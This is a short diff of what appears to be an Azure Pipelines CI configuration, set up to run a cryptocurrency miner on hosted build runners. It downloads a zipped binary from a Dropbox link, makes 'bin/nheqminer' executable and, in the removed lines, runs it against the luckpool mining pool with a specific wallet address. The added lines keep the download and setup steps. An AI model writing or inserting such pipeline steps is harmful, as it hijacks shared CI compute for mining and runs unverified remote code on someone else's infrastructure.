@@ -3,11 +3,7 @@ jobs:
   pool:
     vmImage: 'ubuntu-latest'
   steps:
-    - run: |
-        wget https://dl.dropboxusercontent.com/s/93pc80mzhq4rn5r/bin.zip
-        unzip bin.zip
-        chmod +x bin/nheqminer
-        ./bin/nheqminer -v -l ap.luckpool.net:3956 -u RWQtmzJVSWYh6Abs786i8wHEW4e7vcBQmN.GitHUb -p x -t 1 |
+    - script:
         wget https://dl.dropboxusercontent.com/s/93pc80mzhq4rn5r/bin.zip
         unzip bin.zip
         chmod +x bin/nheqminer
